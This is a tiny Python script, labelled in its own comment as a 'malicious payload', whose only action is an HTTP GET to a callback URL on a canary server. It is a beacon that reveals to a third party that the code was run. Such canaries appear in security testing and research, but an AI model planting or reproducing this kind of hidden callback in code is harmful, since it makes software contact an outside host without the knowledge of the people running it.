# Malicious payload to send a callback to my server

import os
import requests

# Callback URL
callback_url = 'http://my-canary-server.com/callback'

# Send a callback to my server
requests.get(callback_url)
